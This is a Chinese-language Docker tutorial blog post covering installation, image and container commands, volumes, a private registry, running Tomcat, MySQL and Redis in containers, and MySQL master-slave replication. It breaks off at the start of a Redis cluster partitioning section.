<p>仓库（Reppsitory）是集中存放镜像文件的场所。仓库分为公开仓库和私有仓库两种形式。最大的公开仓库是 Docker Hub(<a target="_blank" rel="noopener" href="https://hub.docker.com/)%EF%BC%8C%E5%AD%98%E6%94%BE%E4%BA%86%E6%95%B0%E9%87%8F%E5%BA%9E%E5%A4%A7%E7%9A%84%E9%95%9C%E5%83%8F%E4%BE%9B%E7%94%A8%E6%88%B7%E4%B8%8B%E8%BD%BD%E3%80%82%E5%9B%BD%E5%86%85%E7%9A%84%E5%85%AC%E5%BC%80%E4%BB%93%E5%BA%93%E5%8C%85%E6%8B%AC%E9%98%BF%E9%87%8C%E4%BA%91%E3%80%81%E7%BD%91%E6%98%93%E4%BA%91%E7%AD%89">https://hub.docker.com/)，存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云、网易云等</a></p>
<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><h3 id="1-1-CentOS上的安装"><a href="#1-1-CentOS上的安装" class="headerlink" title="1.1 CentOS上的安装"></a>1.1 CentOS上的安装</h3><p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/centos">https://docs.docker.com/engine/install/centos</a></p>
<p><img src="/2022/02/07/Docker/image-20220208164705609.png" alt="image-20220208164705609"></p>
<p>10.卸载：<img src="/2022/02/07/Docker/image-20220208210231369.png" alt="image-20220208210231369"></p>
<p>*3：yum -y install gcc       yum -y install gcc-c++</p>
<p>*4: yum install -y yum-utils</p>
<p>*5: <img src="/2022/02/07/Docker/image-20220208203537983.png" alt="image-20220208203537983"></p>
<p>原因是这是国外的，会报错</p>
<p>国内：yum-config-manager –add-repo <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p>
<p>*6: yum makecache fast</p>
<p>*7: yum -y install docker-ce docker-ce-cli containerd.io</p>
<p>*8:  <strong>systemctl start docker</strong>  </p>
<p>查看：ps -ef | grep docker</p>
<p>*9 docker version </p>
<p>docker run hello-world   </p>
<p>结果是：Unable to find image ‘hello-world:latest’ locally</p>
<p>latest: Pulling from library/hello-world</p>
<p><img src="/2022/02/07/Docker/image-20220208210123260.png" alt="image-20220208210123260"></p>
<p>代表本地安装docker成功</p>
<h3 id="1-2-镜像加速器配置"><a href="#1-2-镜像加速器配置" class="headerlink" title="1.2 镜像加速器配置"></a>1.2 镜像加速器配置</h3><p>阿里云镜像加速</p>
<p><img src="/2022/02/07/Docker/image-20220208210739352.png" alt="image-20220208210739352">    </p>
<p><img src="/2022/02/07/Docker/image-20220208211414716.png" alt="image-20220208211414716"></p>
<p>找到容器镜像服务</p>
<p><img src="/2022/02/07/Docker/image-20220208211531019.png" alt="image-20220208211531019"></p>
<p><img src="/2022/02/07/Docker/image-20220208211945086.png" alt="image-20220208211945086"></p>
<p>run干了什么</p>
<p> <img src="/2022/02/07/Docker/image-20220208212848797.png" alt="image-20220208212848797"></p>
<h2 id="二、Docker常用命令"><a href="#二、Docker常用命令" class="headerlink" title="二、Docker常用命令"></a>二、Docker常用命令</h2><h3 id="2-1-帮助启动类命令"><a href="#2-1-帮助启动类命令" class="headerlink" title="2.1 帮助启动类命令"></a>2.1 帮助启动类命令</h3><p><img src="/2022/02/07/Docker/image-20220208214215292.png" alt="image-20220208214215292"></p>
<h3 id="2-2-镜像命令"><a href="#2-2-镜像命令" class="headerlink" title="2.2 镜像命令"></a>2.2 镜像命令</h3><p><strong>1、docker images</strong> :列出本地主机上的镜像                                                                               -a:列出本地所有镜像（含历史映像层）   -q:只显示镜像ID</p>
<p><img src="/2022/02/07/Docker/image-20220208224044650.png" alt="image-20220208224044650"></p>
<p><img src="/2022/02/07/Docker/image-20220208224352638.png" alt="image-20220208224352638"></p>
<p><strong>2、docker search [options] 某个xxx镜像名字</strong>：在网站搜寻某个镜像，一般要第一个 官方认证过的  </p>
<p>options：  –limit：只列出N个镜像，默认25    –limit 5</p>
<p><img src="/2022/02/07/Docker/image-20220208225158572.png" alt="image-20220208225158572"></p>
<p><strong>3、docker pull 镜像名字</strong> ：下载镜像</p>
<p>两套写法：docker pull 镜像名字[:TAG]</p>
<p>docker pull 镜像名字 ：没有TAG就是最新版 ，等价于 docker pull 镜像名字:latest</p>
<p><img src="/2022/02/07/Docker/image-20220208230624380.png" alt="image-20220208230624380"></p>
<p><strong>4、docker system df 查看镜像/容器/数据卷所占的空间</strong>  与Linux的                  df -h 类似</p>
<p><img src="/2022/02/07/Docker/image-20220208231407892.png" alt="image-20220208231407892"></p>
<p><strong>5、docker rmi 镜像名字ID ：删除镜像</strong>    若名字没有重复也可以直接docker rmi 镜像名字</p>
<p><img src="/2022/02/07/Docker/image-20220208232110416.png" alt="image-20220208232110416"></p>
<p>docker rmi -f 镜像ID ：强制删除</p>
<p><img src="/2022/02/07/Docker/image-20220208232415371.png" alt="image-20220208232415371"></p>
<p><img src="/2022/02/07/Docker/image-20220208232629127.png" alt="image-20220208232629127"></p>
<p>删除多个的时候也可以用多个image ID</p>
<p><strong>面试题：docker虚悬镜像是<img src="/2022/02/07/Docker/image-20220208233352186.png" alt="image-20220208233352186"></strong></p>
<p><img src="/2022/02/07/Docker/image-20220208233550875.png" alt="image-20220208233550875"></p>
<h3 id="2-3-容器命令"><a href="#2-3-容器命令" class="headerlink" title="2.3 容器命令"></a>2.3 容器命令</h3><p>有镜像才能创建容器</p>
<p><img src="/2022/02/07/Docker/image-20220209133048489.png" alt="image-20220209133048489"></p>
<p>下载 一个Ubuntu镜像 docker pull ubuntu</p>
<p><strong>1、新建+启动容器  docker run [options] IMAGE [COMMAND] [ARG…]</strong></p>
<p><img src="/2022/02/07/Docker/image-20220209134509646.png" alt="image-20220209134509646"></p>
<p><img src="/2022/02/07/Docker/image-20220209135330608.png" alt="image-20220209135330608"></p>
<p>启动交互式容器   -it  弹出一个终端输入更多的命令</p>
<p>docker run -it ubuntu <strong>bash （或者/bin/bash）</strong>  bash: shell交互命令的接口</p>
<p>使用镜像ubuntu以交互模式启动一个容器，在容器内执行/bin/bash命令  /bin/bash或者bash ：放在镜像名后的是命令，这里我们希望有个交互式shell，因此用这，要退出终端，直接输入exit</p>
<p><img src="/2022/02/07/Docker/image-20220209140210903.png" alt="image-20220209140210903"></p>
<p>docker run –help</p>
<p><strong>2、docker ps [options] ：列出当前所有正在运行的容器</strong></p>
<p><img src="/2022/02/07/Docker/image-20220209141632866.png" alt="image-20220209141632866"></p>
<p>–name=busy_rubin</p>
<p>options：<img src="/2022/02/07/Docker/image-20220209143149643.png" alt="image-20220209143149643"></p>
<p>docker ps -n 1</p>
<p><strong>3、退出容器</strong></p>
<p>两种方式：（1）<strong>exit</strong> ：run进去容器，exit退出，容器停止</p>
<p>（2）<strong>Ctrl+p+q</strong> ：run进去容器，Ctrl+p+q退出，容器不停止</p>
<p><strong>4、启动已停止运行的容器：docker start 容器ID或者容器名</strong></p>
<p><strong>5、重启容器：docker restart 容器ID或者容器名</strong></p>
<p>**6、停止容器：docker stop 容器ID或者容器名 **</p>
<p><strong>7、强制停止容器： docker kill 容器ID或者容器名</strong></p>
<p><strong>8、删除已经停止的容器:  docker rm 容器ID或者容器名</strong></p>
<p>强制删除不管是否已停止    docker rm -f 容器ID或者容器名   </p>
<p><img src="/2022/02/07/Docker/image-20220209150702321.png" alt="image-20220209150702321"></p>
<p><strong>重要</strong></p>
<p>下载一个Redis6.0.8镜像演示</p>
<p>（1）启动守护式容器（后台服务器）</p>
<p><img src="/2022/02/07/Docker/image-20220209152951178.png" alt="image-20220209152951178"></p>
<p><img src="/2022/02/07/Docker/image-20220209153311897.png" alt="image-20220209153311897"></p>
<p><img src="/2022/02/07/Docker/image-20220209154343472.png" alt="image-20220209154343472"></p>
<p><img src="/2022/02/07/Docker/image-20220209154704146.png" alt="image-20220209154704146"></p>
<p>(2)查看容器日志 docker logs 容器ID</p>
<p>(3)查看容器内运行的进程  ：docker top 容器ID</p>
<p>(4)查看容器内部细节 ：docker inspect 容器ID</p>
<p>(5)进入正在运行的容器并以命令行交互</p>
<p><img src="/2022/02/07/Docker/image-20220209161123444.png" alt="image-20220209161123444"></p>
<p><img src="/2022/02/07/Docker/image-20220209162039243.png" alt="image-20220209162039243"></p>
<p><img src="/2022/02/07/Docker/image-20220209160729996.png" alt="image-20220209160729996"></p>
<p>(6)从容器内拷贝文件到主机上</p>
<p><img src="/2022/02/07/Docker/image-20220209162524802.png" alt="image-20220209162524802"></p>
<p><img src="/2022/02/07/Docker/image-20220209163554541.png" alt="image-20220209163554541"></p>
<p>(7)导入和导出容器 整个容器备份</p>
<p><img src="/2022/02/07/Docker/image-20220209163852709.png" alt="image-20220209163852709"></p>
<p><img src="/2022/02/07/Docker/image-20220209164214395.png" alt="image-20220209164214395"></p>
<p><img src="/2022/02/07/Docker/image-20220209164739866.png" alt="image-20220209164739866"></p>
<p>​    </p>
<h3 id="2-4-Docker-镜像"><a href="#2-4-Docker-镜像" class="headerlink" title="2.4 Docker 镜像"></a>2.4 Docker 镜像</h3><p>镜像是分层的，远程下载镜像是一层一层下载的</p>
<p>UnionFS(联合文件系统):Union文件系统〈UnionFS)是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚报文件系统下。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p>
<p>特性:一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
<p><img src="/2022/02/07/Docker/image-20220209215615669.png" alt="image-20220209215615669"></p>
<p><img src="/2022/02/07/Docker/image-20220209220328906.png" alt="image-20220209220328906"></p>
<p>镜像分层最大的一个好处就是共享资源，方便复制迁移，就是为了复用。<br>比如说有多个镜像都从相同的base镜像构建而来，那么Docker Host只需在磁盘上保存一份 base镜像;同时内存中也只需加载一份base镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。</p>
<p><strong>Docker镜像层都是只读的，容器层是可写的</strong>，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。</p>
<h3 id="2-5-commit命令"><a href="#2-5-commit命令" class="headerlink" title="2.5 commit命令"></a>2.5 commit命令</h3><p><img src="/2022/02/07/Docker/image-20220209222109214.png" alt="image-20220209222109214"></p>
<p><img src="/2022/02/07/Docker/image-20220209222227755.png" alt="image-20220209222227755"></p>
<p>在当前镜像的基础上，不具备vim命令，给它加一个vim命令，让其容器实例具备这个功能，在反向让他生成一个新的镜像，我们自己commit出来的新的镜像就具备vim命令的新的镜像版本</p>
<p>*案例演示ubuntu安装vim</p>
<p><img src="/2022/02/07/Docker/image-20220209223013679.png" alt="image-20220209223013679"></p>
<p><strong>安装vim</strong> ：apt-get update      apt-get -y install vim</p>
<p><img src="/2022/02/07/Docker/image-20220209223150169.png" alt="image-20220209223150169"></p>
<p> <img src="/2022/02/07/Docker/image-20220209223413804.png" alt="image-20220209223413804"></p>
<p><strong>commit新镜像</strong>：</p>
<p><img src="/2022/02/07/Docker/image-20220209224444527.png" alt="image-20220209224444527"></p>
<h2 id="三、本地镜像发布到阿里云"><a href="#三、本地镜像发布到阿里云" class="headerlink" title="三、本地镜像发布到阿里云"></a>三、本地镜像发布到阿里云</h2><p><strong>阿里云开发者平台</strong>：<a target="_blank" rel="noopener" href="https://promotion.aliyun.com/ntms/act/kubernetes.html">https://promotion.aliyun.com/ntms/act/kubernetes.html</a></p>
<p><strong>进入后：创建仓库镜像</strong></p>
<p><img src="/2022/02/07/Docker/image-20220210114434360.png" alt="image-20220210114434360"></p>
<p>命名空间</p>
<p><img src="/2022/02/07/Docker/image-20220210114613620.png" alt="image-20220210114613620"></p>
<p>仓库名称</p>
<p><img src="/2022/02/07/Docker/image-20220210114854173.png" alt="image-20220210114854173"></p>
<p><img src="/2022/02/07/Docker/image-20220210114923535.png" alt="image-20220210114923535"></p>
<p>进入管理界面获得脚本<img src="/2022/02/07/Docker/image-20220210115014282.png" alt="image-20220210115014282"></p>
<p><strong>将镜像推送到阿里云</strong></p>
<p><img src="/2022/02/07/Docker/image-20220210115308783.png" alt="image-20220210115308783"></p>
<p><img src="/2022/02/07/Docker/image-20220210115607336.png" alt="image-20220210115607336"></p>
<p><strong>将阿里云上的镜像下载到本地</strong></p>
<p><img src="/2022/02/07/Docker/image-20220210115723557.png" alt="image-20220210115723557"></p>
<h2 id="四、docker私有库"><a href="#四、docker私有库" class="headerlink" title="四、docker私有库"></a>四、docker私有库</h2><p>Docker Registry 是官方提供的工具，可以用于构建私有镜像仓库</p>
<p><strong>方法步骤：</strong></p>
<p>（1）下载镜像Docker Registry</p>
<p><img src="/2022/02/07/Docker/image-20220210123451823.png" alt="image-20220210123451823"></p>
<p>(2)运行私有库Registry，相当于本地有个私有Docker hub</p>
<p><img src="/2022/02/07/Docker/image-20220210123600493.png" alt="image-20220210123600493"></p>
<p>(3)案例演示创建一个新镜像，ubuntu安装ifconfig命令</p>
<p><img src="/2022/02/07/Docker/image-20220210124418605.png" alt="image-20220210124418605"></p>
<p> apt-get update        apt-get install net-tools</p>
<p>docker commit -m=”提交的描述信息” -a=”作者” 容器ID 要创建的目标镜像名:[标签名]</p>
<p>命令：在容器外执行，记得</p>
<p>(4)curl验证私服库上有什么镜像</p>
<p><img src="/2022/02/07/Docker/image-20220210125730105.png" alt="image-20220210125730105"></p>
<p>http后的ip自己改</p>
<p>(5)将新镜像zzyyubuntu:1.2修改符合私服规范的Tag</p>
<p><img src="/2022/02/07/Docker/image-20220210130049739.png" alt="image-20220210130049739"></p>
<p>(6)修改配置文件使之支持http</p>
<p><img src="/2022/02/07/Docker/image-20220210130206934.png" alt="image-20220210130206934"></p>
<p>(7)push推送到私服库</p>
<p><img src="/2022/02/07/Docker/image-20220210130306929.png" alt="image-20220210130306929"></p>
<p>(8)curl验证私服库上有什么镜像2</p>
<p><img src="/2022/02/07/Docker/image-20220210130409895.png" alt="image-20220210130409895"></p>
<p>(9)pull到本地并运行</p>
<p><img src="/2022/02/07/Docker/image-20220210130437773.png" alt="image-20220210130437773"></p>
<h2 id="五、docker容器数据卷"><a href="#五、docker容器数据卷" class="headerlink" title="五、docker容器数据卷"></a>五、docker容器数据卷</h2><h3 id="5-1-坑"><a href="#5-1-坑" class="headerlink" title="5.1 坑"></a>5.1 坑</h3><p><img src="/2022/02/07/Docker/image-20220210141817103.png" alt="image-20220210141817103"></p>
<p>why</p>
<p><img src="/2022/02/07/Docker/image-20220210141914460.png" alt="image-20220210141914460"></p>
<h3 id="5-2-回顾"><a href="#5-2-回顾" class="headerlink" title="5.2 回顾"></a>5.2 回顾</h3><p>上一节 运行私有库registry命令                             docker run -d -p 5000:5000 <strong>-v /zzyyuse/myregistry/:/tmp/registry –privileged=true</strong> registry</p>
<p>-v:添加自定义的容器卷   冒号左边：宿主机的路径   冒号右边：容器内路径</p>
<p>–privileged=true：放开权限</p>
<h3 id="5-3-理解，是什么"><a href="#5-3-理解，是什么" class="headerlink" title="5.3 理解，是什么"></a>5.3 理解，是什么</h3><p>卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File System提供一些用于持续存储或共享数据的特性：<br>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷</p>
<p><img src="/2022/02/07/Docker/image-20220210151115289.png" alt="image-20220210151115289"></p>
<p><img src="/2022/02/07/Docker/image-20220210143045906.png" alt="image-20220210143045906"></p>
<p><strong>命令： docker run -it –privileged=true -v /宿主机绝对路径目录:/容器内目录      镜像名</strong></p>
<h3 id="5-4-能干嘛"><a href="#5-4-能干嘛" class="headerlink" title="5.4 能干嘛"></a>5.4 能干嘛</h3><p>* 将运用与运行的环境打包镜像，run后形成容器实例运行 ，但是我们对数据的要求希望是持久化的</p>
<p>Docker容器产生的数据，如果不备份，那么当容器实例删除后，容器内的数据自然也就没有了。</p>
<p>为了能保存数据在docker中我们使用卷。</p>
<p>特点：</p>
<p>1：数据卷可在容器之间共享或重用数据</p>
<p>2：卷中的更改可以直接实时生效，爽</p>
<p>3：数据卷中的更改不会包含在镜像的更新中</p>
<p>4：数据卷的生命周期一直持续到没有容器使用它为止</p>
<h3 id="5-5-数据卷案例"><a href="#5-5-数据卷案例" class="headerlink" title="5.5 数据卷案例"></a>5.5 数据卷案例</h3><h4 id="5-5-1-容器卷和主机互通互连"><a href="#5-5-1-容器卷和主机互通互连" class="headerlink" title="5.5.1 容器卷和主机互通互连"></a>5.5.1 容器卷和主机互通互连</h4><p><img src="/2022/02/07/Docker/image-20220210144457591.png" alt="image-20220210144457591"></p>
<p><img src="/2022/02/07/Docker/image-20220210144614121.png" alt="image-20220210144614121"></p>
<p>若没有这个目录，这个命令可以自建这个目录</p>
<p>容器内目录下的数据会同步到宿主机那个目录下:</p>
<p><img src="/2022/02/07/Docker/image-20220210145214016.png" alt="image-20220210145214016"></p>
<p><img src="/2022/02/07/Docker/image-20220210145249820.png" alt="image-20220210145249820"></p>
<p>主机上操作的数据内容也会被同步到容器内目录，容器与宿主机之间数据共享</p>
<p>1 docker修改，主机同步获得 </p>
<p>2 主机修改，docker同步获得</p>
<p>3 docker容器stop，主机修改，docker容器重启看数据也能成功同步。</p>
<p><strong>查看数据卷是否挂载成功</strong></p>
<p><img src="/2022/02/07/Docker/image-20220210145620458.png" alt="image-20220210145620458"></p>
<h4 id="5-5-2-容器卷ro和rw读写规则"><a href="#5-5-2-容器卷ro和rw读写规则" class="headerlink" title="5.5.2 容器卷ro和rw读写规则"></a>5.5.2 容器卷ro和rw读写规则</h4><p>（1）读写(默认)   默认同上案例，默认就是rw</p>
<p> docker run -it –privileged=true -v /宿主机绝对路径目录:/容器内目录:rw      镜像名</p>
<p>（2）只读</p>
<p>容器实例内部被限制，只能读取不能写</p>
<p> docker run -it –privileged=true -v /宿主机绝对路径目录:/容器内目录:ro      镜像名</p>
<p><img src="/2022/02/07/Docker/image-20220210160856814.png" alt="image-20220210160856814"></p>
<h4 id="5-5-3-卷的继承和共享"><a href="#5-5-3-卷的继承和共享" class="headerlink" title="5.5.3 卷的继承和共享"></a>5.5.3 卷的继承和共享</h4><p>（1）容器1完成和宿主机的映射</p>
<p><img src="/2022/02/07/Docker/image-20220210162848795.png" alt="image-20220210162848795"></p>
<p>（2）容器2继承容器1的卷规则</p>
<p>docker run -it  –privileged=true –volumes-from 父类  –name u2 ubuntu</p>
<p><img src="/2022/02/07/Docker/image-20220210163049206.png" alt="image-20220210163049206"></p>
<p>三者共享</p>
<h2 id="六、Docker上安装常用软件说明"><a href="#六、Docker上安装常用软件说明" class="headerlink" title="六、Docker上安装常用软件说明"></a>六、Docker上安装常用软件说明</h2><h3 id="6-1-总体步骤"><a href="#6-1-总体步骤" class="headerlink" title="6.1  总体步骤"></a>6.1  总体步骤</h3><p><img src="/2022/02/07/Docker/image-20220210194529147.png" alt="image-20220210194529147"></p>
<h3 id="6-2-安装tomcat"><a href="#6-2-安装tomcat" class="headerlink" title="6.2 安装tomcat"></a>6.2 安装tomcat</h3><p>（1）docker hub上面查找tomcat镜像：docker search tomcat<img src="/2022/02/07/Docker/image-20220210201955588.png" alt="image-20220210201955588"></p>
<p>(2)从docker hub上拉取tomcat镜像到本地: docker pull tomcat</p>
<p>(3)docker images查看是否有拉取到的tomcat</p>
<p>(4)使用tomcat镜像创建容器实例(也叫运行镜像):                                                   docker run -it -p 8080:8080 tomcat           -d:后台</p>
<p><img src="/2022/02/07/Docker/image-20220210202351746.png" alt="image-20220210202351746"></p>
<p>(5)访问猫首页  :在Linux浏览器上访问localhost:8080</p>
<p><img src="/2022/02/07/Docker/image-20220210202457995.png" alt="image-20220210202457995"></p>
<p><img src="/2022/02/07/Docker/image-20220210203523391.png" alt="image-20220210203523391"></p>
<p>*先成功启动tomcat<img src="/2022/02/07/Docker/image-20220210202532495.png" alt="image-20220210202532495"></p>
<p>*查看webapps文件夹查看为空<img src="/2022/02/07/Docker/image-20220210202651658.png" alt="image-20220210202651658"></p>
<p>(6)免修改版说明</p>
<p><img src="/2022/02/07/Docker/image-20220210202737338.png" alt="image-20220210202737338"></p>
<p><img src="/2022/02/07/Docker/image-20220210202823125.png" alt="image-20220210202823125"></p>
<h3 id="6-3-安装mysql"><a href="#6-3-安装mysql" class="headerlink" title="6.3 安装mysql"></a>6.3 安装mysql</h3><p><img src="/2022/02/07/Docker/image-20220210232707127.png" alt="image-20220210232707127"></p>
<h4 id="简单版："><a href="#简单版：" class="headerlink" title="简单版："></a>简单版：</h4><p>（1）使用mysql镜像</p>
<p><img src="/2022/02/07/Docker/image-20220210233228417.png" alt="image-20220210233228417"></p>
<p>(2)建库建表插入数据</p>
<p><img src="/2022/02/07/Docker/image-20220210233704516.png" alt="image-20220210233704516"></p>
<p>(3)外部Win10也来连接运行在dokcer上的mysql容器实例服务</p>
<p><img src="/2022/02/07/Docker/image-20220210233809179.png" alt="image-20220210233809179"></p>
<p>(4)问题</p>
<p><img src="/2022/02/07/Docker/image-20220210233837682.png" alt="image-20220210233837682"></p>
<p><img src="/2022/02/07/Docker/image-20220210233912262.png" alt="image-20220210233912262"></p>
<p><img src="/2022/02/07/Docker/image-20220210233935364.png" alt="image-20220210233935364"></p>
<p>删除容器后，里面的mysql数据如何办?</p>
<p>数据没有了</p>
<h4 id="实战版："><a href="#实战版：" class="headerlink" title="实战版："></a>实战版：</h4><p>（1）新建mysql容器实例</p>
<p>docker run -d -p 3306:3306 –privileged=true </p>
<p>-v /zzyyuse/mysql/log:/var/log/mysql </p>
<p>-v /zzyyuse/mysql/data:/var/lib/mysql </p>
<p>-v /zzyyuse/mysql/conf:/etc/mysql/conf.d </p>
<p>-e MYSQL_ROOT_PASSWORD=123456 –name mysql mysql:5.7</p>
<p>conf: mysql配置文件 </p>
<p><img src="/2022/02/07/Docker/image-20220211222125685.png" alt="image-20220211222125685"></p>
<p>（2）<strong>新建my.cnf</strong>：通过容器卷同步给mysql容器实例，解决中文乱码问题</p>
<p><img src="/2022/02/07/Docker/image-20220211223621109.png" alt="image-20220211223621109"></p>
<p>（3）<strong>重新启动mysql</strong>容器实例再重新进入并查看字符编码</p>
<p><img src="/2022/02/07/Docker/image-20220211224511997.png" alt="image-20220211224511997"></p>
<p>（4）再新建库新建表再插入中文测试</p>
<p><img src="/2022/02/07/Docker/image-20220211225108861.png" alt="image-20220211225108861"></p>
<p>结论：docker安装完MySQL并run出容器后，建议请先修改完字符集编码后再新建mysql库-表-插数据</p>
<p>假如将当前容器实例删除，再重新来一次，之前建的db01实例还有</p>
<h3 id="6-4-安装Redis"><a href="#6-4-安装Redis" class="headerlink" title="6.4 安装Redis"></a>6.4 安装Redis</h3><p>（1）从docker hub上(阿里云加速器)拉取redis镜像到本地标签为6.0.8</p>
<p>（2）运行</p>
<p><img src="/2022/02/07/Docker/image-20220212154851236.png" alt="image-20220212154851236"></p>
<p>命令提醒：容器卷记得加入–privileged=true</p>
<p>(3)在CentOS宿主机下新建目录/app/redis</p>
<p><img src="/2022/02/07/Docker/image-20220212155011424.png" alt="image-20220212155011424"></p>
<p>(4)将一个redis.conf文件模板拷贝进/app/redis目录下</p>
<p><img src="/2022/02/07/Docker/image-20220212155059752.png" alt="image-20220212155059752"></p>
<p>(5)/app/redis目录下修改redis.conf文件</p>
<p><img src="/2022/02/07/Docker/image-20220212155208087.png" alt="image-20220212155208087"></p>
<p>(6)使用redis6.0.8镜像创建容器(也叫运行镜像)</p>
<p>docker run -p 6379:6379 –name myr3 –privileged=true </p>
<p>-v /app/redis/redis.conf:/etc/redis/redis.conf </p>
<p>-v /app/redis/data:/data </p>
<p>-d redis:6.0.8 </p>
<p>redis-server /etc/redis/redis.conf</p>
<p><img src="/2022/02/07/Docker/image-20220212155605635.png" alt="image-20220212155605635"></p>
<p>(7)测试redis-cli连接上来<img src="/2022/02/07/Docker/image-20220212155750246.png" alt="image-20220212155750246"></p>
<p>(8)请证明docker启动使用了我们自己指定的配置文件</p>
<p>修改前<img src="/2022/02/07/Docker/image-20220212155844316.png" alt="image-20220212155844316"></p>
<p>修改后   <img src="/2022/02/07/Docker/image-20220212155914030.png" alt="image-20220212155914030"></p>
<p>记得重启服务</p>
<p>(9)测试redis-cli连接上来第2次</p>
<p><img src="/2022/02/07/Docker/image-20220212160043915.png" alt="image-20220212160043915"></p>
<h1 id="高级篇"><a href="#高级篇" class="headerlink" title="高级篇"></a>高级篇</h1><h1 id="Docker复杂安装详说"><a href="#Docker复杂安装详说" class="headerlink" title="Docker复杂安装详说"></a>Docker复杂安装详说</h1><h2 id="一、mysql主从复制docker版"><a href="#一、mysql主从复制docker版" class="headerlink" title="一、mysql主从复制docker版"></a>一、mysql主从复制docker版</h2><p><strong>1、新建主服务器容器实例3307</strong></p>
<p>docker run -p 3307:3306 –name mysql-master \</p>
<p>-v /mydata/mysql-master/log:/var/log/mysql \</p>
<p>-v /mydata/mysql-master/data:/var/lib/mysql \</p>
<p>-v /mydata/mysql-master/conf:/etc/mysql \</p>
<p>-e MYSQL_ROOT_PASSWORD=root \</p>
<p>-d mysql:5.7</p>
<p><strong>2、进入/mydata/mysql-master/conf目录下新建my.cnf：vim my.cnf</strong> </p>
<p><img src="/2022/02/07/Docker/image-20220212195317865.png" alt="image-20220212195317865"></p>
<p><strong>3、修改完配置后重启master实例</strong>:docker restart mysql-master</p>
<p><strong>4、进入mysql-master容器</strong></p>
<p>docker exec -it mysql-master /bin/bash      mysql -uroot -proot</p>
<p><strong>5、master容器实例内创建数据同步用户</strong></p>
<p>CREATE USER ‘slave‘@’%’ IDENTIFIED BY ‘123456’;</p>
<p>GRANT REPLICATION SLAVE, REPLICATION CLIENT ON <em>.</em> TO ‘slave‘@’%’;</p>
<p><strong>6、新建从服务器容器实例3308</strong></p>
<p>docker run -p 3308:3306 –name mysql-slave \</p>
<p>-v /mydata/mysql-slave/log:/var/log/mysql \</p>
<p>-v /mydata/mysql-slave/data:/var/lib/mysql \</p>
<p>-v /mydata/mysql-slave/conf:/etc/mysql \</p>
<p>-e MYSQL_ROOT_PASSWORD=root \</p>
<p>-d mysql:5.7</p>
<p><strong>7、进入/mydata/mysql-slave/conf目录下新建my.cnf：vim my.cnf</strong></p>
<p><img src="/2022/02/07/Docker/image-20220212195530066.png" alt="image-20220212195530066"></p>
<p><strong>8、修改完配置后重启slave实例：docker restart mysql-slave</strong></p>
<p><strong>9、在主数据库中查看主从同步状态：show master status;</strong></p>
<p><strong>10、进入mysql-slave容器</strong></p>
<p>docker exec -it mysql-slave /bin/bash           mysql -uroot -proot</p>
<p><strong>11、在从数据库中配置主从复制</strong></p>
<p>change master to master_host=’192.168.197.134’, master_user=’slave’, master_password=’123456’, master_port=3307, master_log_file=’mall-mysql-bin.000001’, master_log_pos=617, master_connect_retry=30;</p>
<p><img src="/2022/02/07/Docker/image-20220212200805500.png" alt="image-20220212200805500"></p>
<p>主从复制命令参数说明</p>
<p>master_host：主数据库的IP地址；</p>
<p>master_port：主数据库的运行端口；</p>
<p>master_user：在主数据库创建的用于同步数据的用户账号；</p>
<p>master_password：在主数据库创建的用于同步数据的用户密码；</p>
<p>master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；</p>
<p>master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；</p>
<p>master_connect_retry：连接失败重试的时间间隔，单位为秒。</p>
<p><strong>12、在从数据库中查看主从同步状态</strong>：show slave status \G;</p>
<p><img src="/2022/02/07/Docker/image-20220212211225456.png" alt="image-20220212211225456"></p>
<p><strong>13、在从数据库中开启主从同步</strong></p>
<p><img src="/2022/02/07/Docker/image-20220212200925348.png" alt="image-20220212200925348"></p>
<p><strong>14、查看从数据库状态发现已经同步</strong></p>
<p><img src="/2022/02/07/Docker/image-20220212201001559.png" alt="image-20220212201001559"></p>
<p><strong>15、主从复制测试</strong></p>
<p>主机新建库-使用库-新建表-插入数据，ok</p>
<p>从机使用库-查看记录，ok</p>
<p>主：<img src="/2022/02/07/Docker/image-20220212211841298.png" alt="image-20220212211841298"></p>
<p>从：<img src="/2022/02/07/Docker/image-20220212211915431.png" alt="image-20220212211915431"></p>
<h2 id="二、安装redis集群-分布式存储"><a href="#二、安装redis集群-分布式存储" class="headerlink" title="二、安装redis集群    分布式存储"></a>二、安装redis集群    分布式存储</h2><p>面试题：1~2亿条数据需要缓存，请问如何设计这个存储案例</p>
<p>回答：单机单台100%不可能，肯定是分布式存储，用redis如何落地？</p>
<p>上述问题阿里P6~P7工程案例和场景设计类必考题目，一般业界有3种解决方案2.1-2.3</p>
<h3 id="2-1-哈希取余算法分区"><a href="#2-1-哈希取余算法分区" class="headerlink" title="2.1 哈希取余算法分区"></a>2.1 哈希取余算法分区</h3><p><strong>哈希取余</strong>为第一种</p>
<p>2亿条记录就是2亿个k,v，我们单机不行必须要分布式多机，假设有3台机器构成一个集群，用户每次读写操作都是根据公式：</p>
<p>hash(key) % N个机器台数，计算出哈希值，用来决定数据映射到哪一个节点上。</p>
<p>优点：</p>
<p> 简单粗暴，直接有效，只需要预估好数据规划好节点，例如3台、8台、10台，就能保证一段时间的数据支撑。使用Hash算法让固定的一部分请求落到同一台服务器上，这样每台服务器固定处理一部分请求（并维护这些请求的信息），起到负载均衡+分而治之的作用。</p>
<p>缺点：</p>
